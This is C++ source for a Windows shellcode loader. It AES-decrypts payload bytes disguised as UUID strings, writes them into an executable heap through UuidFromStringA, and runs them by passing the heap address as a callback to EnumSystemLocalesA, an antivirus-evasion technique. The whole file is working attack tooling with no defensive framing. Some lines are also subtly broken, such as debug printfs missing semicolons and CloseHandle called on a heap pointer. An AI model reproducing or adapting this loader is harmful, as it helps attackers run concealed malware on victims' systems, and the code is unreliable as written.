// ReSharper disable CppLocalVariableMayBeConst
// ReSharper disable CppUseAuto
// ReSharper disable CppClangTidyModernizeUseAuto
// ReSharper disable CppCStyleCast
// ReSharper disable CppClangTidyClangDiagnosticCastQual
#include <iostream>
#include <Windows.h>

#include "aes.h"
#include "filters.h"
#include "modes.h"

#include "CryptPayload.h"

#pragma comment(lib, "cryptlib")

typedef RPC_STATUS(__stdcall* UA)(RPC_CSTR, UUID*);

UA fUuidFromStringA;

int main()
{	
    HMODULE rpcrt4Dll = LoadLibraryA("Rpcrt4.dll");
    if (rpcrt4Dll)
    {
        fUuidFromStringA = (UA)GetProcAddress(rpcrt4Dll, "UuidFromStringA");
        if (!fUuidFromStringA)
        {
#ifdef _DEBUG
        	printf("[-] Unable to get proc address: UuidFromStringA\n")
#endif
        	return -1;
        }            
    }
    else
    {
#ifdef _DEBUG
        printf("[-] Unable to load library: Rpcrt4.dll\n")
#endif
        return -1;
    }
        

	HANDLE hc = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
    void* ha = nullptr;
	if (hc)
        ha = HeapAlloc(hc, 0, 0x100000);
    DWORD_PTR hptr = (DWORD_PTR)ha;
	
    int elems = sizeof(encryptedUuids) / sizeof(encryptedUuids[0]);

    CryptoPP::CBC_Mode<CryptoPP::AES>::Decryption dec;
    dec.SetKeyWithIV(key, sizeof(key), iv, sizeof(iv));
	
    for (int i = 0; i < elems; i++) 
    {
	    std::string recoveredUuid;
    	CryptoPP::ArraySource s(
            encryptedUuids[i], 
            sizeof(encryptedUuids[i]), 
            true,
            new CryptoPP::StreamTransformationFilter(
                dec,
                new CryptoPP::StringSink(recoveredUuid)
		    )
        );

#ifdef _DEBUG
        printf("[+] %s\n", recoveredUuid.c_str());
#endif
    	
        RPC_STATUS status = fUuidFromStringA((RPC_CSTR)recoveredUuid.c_str(), (UUID*)hptr);
        if (status != RPC_S_OK) {
#ifdef _DEBUG
            printf("[-] UuidFromStringA() != S_OK\n");
#endif
            if (ha)
				CloseHandle(ha);

            return -1;
        }
        hptr += 16;
    }
	
#ifdef _DEBUG
    printf("[*] Hexdump: ");
    for (int i = 0; i < elems * 16; i++) {
        printf("%02X ", ((unsigned char*)ha)[i]);
    }
#endif

	if (ha)
	{
        EnumSystemLocalesA((LOCALE_ENUMPROCA)ha, 0);
        CloseHandle(ha);
        return 0;
	}
    return -2;
}